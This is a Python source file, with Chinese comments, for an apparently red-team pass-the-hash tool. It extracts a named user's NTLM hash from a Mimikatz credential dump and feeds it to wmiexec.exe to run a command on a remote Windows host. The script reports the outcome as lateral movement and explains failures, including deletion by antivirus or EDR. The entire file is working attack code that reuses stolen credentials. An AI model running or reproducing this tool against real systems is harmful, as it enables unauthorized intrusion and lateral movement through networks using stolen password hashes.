import re
import sys
import os
import subprocess

def parse_mimikatz_for_ntlm(target_user, log_file="mimikatz.txt"):
    if not os.path.exists(log_file):
        print(f"[-] Error: Log file '{log_file}' not found.")
        return None

    content = ""
    # 解決編碼問題：嘗試多種格式讀取
    for enc in ['utf-16', 'utf-16-le', 'utf-8', 'ascii']:
        try:
            with open(log_file, "r", encoding=enc, errors="ignore") as f:
                temp = f.read()
                if "Authentication Id" in temp:
                    content = temp
                    break
        except:
            continue

    if not content:
        return None

    #依照 "Authentication Id" 切割大區塊
    blocks = content.split("Authentication Id")
    
    for block in blocks:
        # 檢查此區塊是否包含目標 User Name (使用強匹配避免抓到 PC01$)
        # 我們搜尋 "User Name : Administrator" 這種格式
        user_pattern = rf"User Name\s*:\s+{re.escape(target_user)}\b"
        if re.search(user_pattern, block, re.IGNORECASE):
            
            # 如果帳號對了，就在「同一個區塊內」找 NTLM
            # 考慮到 Mimikatz 輸出格式，NTLM 前面可能會有 [00000003] 或 * 等符號
            # 匹配 NTLM : 後接 32 位元的 Hex
            hash_pattern = r"NTLM\s*:\s*([a-fA-F0-9]{32})"
            hash_match = re.search(hash_pattern, block, re.IGNORECASE)
            
            if hash_match:
                ntlm = hash_match.group(1)
                # 排除空密碼常見的 Hash (31d6cfe0d16ae931b73c59d7e0c089c0)
                if ntlm.lower() != "31d6cfe0d16ae931b73c59d7e0c089c0":
                    return ntlm

    return None

def main():
    if len(sys.argv) < 3:
        print("Usage: pth_tool.exe [Username] [Target_IP]")
        sys.exit(1)

    find_user = sys.argv[1]
    target_ip = sys.argv[2]
    log_name = "mimikatz.txt" 
    tool_name = "wmiexec.exe" # 之後若改 exe 這裡要手動改

    print(f"[*] Extracting NTLM hash for user '{find_user}'...")
    ntlm_hash = parse_mimikatz_for_ntlm(find_user, log_name)

    if ntlm_hash:
        print(f"[+] Found Verified Hash: {ntlm_hash}")

        # 檢查工具是否存在
        if not os.path.exists(tool_name):
            print(f"Error: '{tool_name}' not found.")
            sys.exit(1)

        # 執行指令
        attack_command = [tool_name, "-hashes", f":{ntlm_hash}", f"{find_user}@{target_ip}", "dir C:\\"]
        
        print(f"Targeting Remote Host: {target_ip}")
        print(f"Authenticating as: {find_user}")

        try:
            result = subprocess.run(
                attack_command, 
                check=True, 
                capture_output=True, 
                text=True
            )
            print(result.stdout)
            print(f"[+] SUCCESS: Lateral movement to {target_ip} completed.")

        except subprocess.CalledProcessError as e:
            std_out = e.stdout if e.stdout else ""
            std_err = e.stderr if e.stderr else ""
            error_msg = (std_out + std_err).lower()
            print(f"[-] FAILURE: Command failed with return code ({e.returncode}).")

            # --- 更加精確的判斷邏輯 ---
            if "access_denied" in error_msg or "0xc0000022" in error_msg:
                print("    - Reason: Access Denied (0xc0000022).")
            elif "logon_failure" in error_msg or "0xc000006d" in error_msg:
                print("    - Reason: Authentication Failed (Invalid NTLM Hash).")    
            elif "rpc_s_server_unavailable" in error_msg or "connection refused" in error_msg:
                print("    - Reason: Network Connectivity Issue (Port 135 blocked or Target Offline).")
    
            elif "status_object_name_not_found" in error_msg:
                print("    - Reason: Admin share (ADMIN$) is disabled on the target.")

            elif e.returncode == 127:
                print("    - Reason: Tool path error or Python environment issue.")
            else:
                print(f"    - Raw Intercepted Error: {error_msg.strip()}")        
        except FileNotFoundError:
            print(f"FAILURE: '{tool_name}' disappeared during execution!")
            print("Reason: Highly likely deleted by Real-Time Protection (AV/EDR).")

        except Exception as e:
            print(f"FAILURE: An unexpected error occurred: {e}")

if __name__ == "__main__":
    main()
